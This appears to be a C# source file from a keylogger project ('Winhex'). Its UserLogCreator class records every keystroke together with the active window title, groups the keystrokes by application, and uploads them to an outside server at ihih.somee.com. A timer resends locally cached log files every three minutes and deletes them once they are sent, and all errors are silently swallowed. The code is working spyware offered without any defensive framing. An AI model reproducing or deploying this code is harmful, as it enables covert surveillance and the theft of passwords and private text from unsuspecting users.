using System;
using System.IO;
using System.Management;
using System.Runtime.Serialization.Formatters.Binary;
using System.Timers;
using Newtonsoft.Json;
using Winhex.Interfaces;

namespace Winhex.Models
{
    public class UserLogCreator : ILogCreator
    {
        private UserAction _lastAction;
        private UserLog _currentUserLog;

        private Timer _filesSender;
        public UserLogCreator()
        {
            _currentUserLog = new UserLog();
            _lastAction = new UserAction();

            _filesSender = new Timer(3 * 60 * 1000);
            _filesSender.Elapsed += _filesSender_Elapsed;
            _filesSender.Start();
        }

        private void _filesSender_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                var files = Directory.GetFiles("Logs");

                foreach (var file in files)
                {
                    if (WebSender.SendToServer(JsonConvert.DeserializeObject<UserLog>(File.ReadAllText(file)),
                        "http://www.ihih.somee.com/upload"))
                        File.Delete(file);
                }
            }
            catch { }
        }

        public void AddKey(string appTitle, char key)
        {
            try
            {
                if (!appTitle.Equals(_lastAction.AppTitle))
                {
                    if (_lastAction.TextLog.Length != 0)
                        _currentUserLog.Logs.Add(_lastAction);

                    if (!WebSender.SendToServer(_currentUserLog, "http://www.ihih.somee.com/upload"))
                        SaveToFile(_currentUserLog);

                    _currentUserLog = new UserLog();
                    _lastAction = new UserAction() {ActionDateTime = DateTime.Now, AppTitle = appTitle};
                }

                if (key == '`') _lastAction.TextLog += " [bs] ";
                else _lastAction.TextLog += key;
            }
            catch { }
        }

        private static void SaveToFile(UserLog log)
        {
            try
            {
                Directory.CreateDirectory("Logs");
                File.WriteAllText($"Logs/{Path.GetRandomFileName()}", JsonConvert.SerializeObject(log));
            }
            catch { }
        }

        public void Close()
        {
            if (!WebSender.SendToServer(_currentUserLog, "http://www.ihih.somee.com/upload"))
                SaveToFile(_currentUserLog);
            _filesSender.Stop();
        }
    }
}